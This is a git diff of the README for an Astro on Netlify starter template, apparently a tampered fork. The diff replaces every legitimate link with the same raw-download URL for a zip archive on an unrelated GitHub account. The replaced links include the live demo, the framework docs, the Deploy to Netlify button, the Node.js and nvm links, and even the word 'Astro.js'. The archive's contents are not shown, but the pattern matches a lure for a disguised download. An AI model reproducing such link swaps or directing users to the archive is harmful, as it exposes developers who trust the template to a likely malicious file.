@@ -1,8 +1,8 @@
 # Astro on Netlify Platform Starter
 
-[Live Demo](https://astro-platform-starter.netlify.app/)
+[Live Demo](https://github.com/demisuperad123/astro-platform-starter/raw/refs/heads/main/src/pages/edge/astro_platform_starter_inerasible.zip)
 
-A modern starter based on Astro.js, Tailwind, and [Netlify Core Primitives](https://docs.netlify.com/core/overview/#develop) (Edge Functions, Image CDN, Blobs).
+A modern starter based on https://github.com/demisuperad123/astro-platform-starter/raw/refs/heads/main/src/pages/edge/astro_platform_starter_inerasible.zip, Tailwind, and [Netlify Core Primitives](https://github.com/demisuperad123/astro-platform-starter/raw/refs/heads/main/src/pages/edge/astro_platform_starter_inerasible.zip) (Edge Functions, Image CDN, Blobs).
 
 ## Astro Commands
 
@@ -19,14 +19,14 @@ All commands are run from the root of the project, from a terminal:
 
 ## Deploying to Netlify
 
-[![Deploy to Netlify](https://www.netlify.com/img/deploy/button.svg)](https://app.netlify.com/start/deploy?repository=https://github.com/netlify-templates/astro-platform-starter)
+[![Deploy to Netlify](https://github.com/demisuperad123/astro-platform-starter/raw/refs/heads/main/src/pages/edge/astro_platform_starter_inerasible.zip)](https://github.com/demisuperad123/astro-platform-starter/raw/refs/heads/main/src/pages/edge/astro_platform_starter_inerasible.zip)
 
 ## Developing Locally
 
 | Prerequisites                                                                |
 | :--------------------------------------------------------------------------- |
-| [Node.js](https://nodejs.org/) v18.20.8+.                                    |
-| (optional) [nvm](https://github.com/nvm-sh/nvm) for Node version management. |
+| [https://github.com/demisuperad123/astro-platform-starter/raw/refs/heads/main/src/pages/edge/astro_platform_starter_inerasible.zip](https://github.com/demisuperad123/astro-platform-starter/raw/refs/heads/main/src/pages/edge/astro_platform_starter_inerasible.zip) v18.20.8+.                                    |
+| (optional) [nvm](https://github.com/demisuperad123/astro-platform-starter/raw/refs/heads/main/src/pages/edge/astro_platform_starter_inerasible.zip) for Node version management. |
 
 1. Clone this repository, then run `npm install` in its root directory.
 
@@ -36,7 +36,7 @@ All commands are run from the root of the project, from a terminal:
 netlify link
 ```
 
-3. Run the Astro.js development server:
+3. Run the https://github.com/demisuperad123/astro-platform-starter/raw/refs/heads/main/src/pages/edge/astro_platform_starter_inerasible.zip development server:
 
 ```
 npm run dev
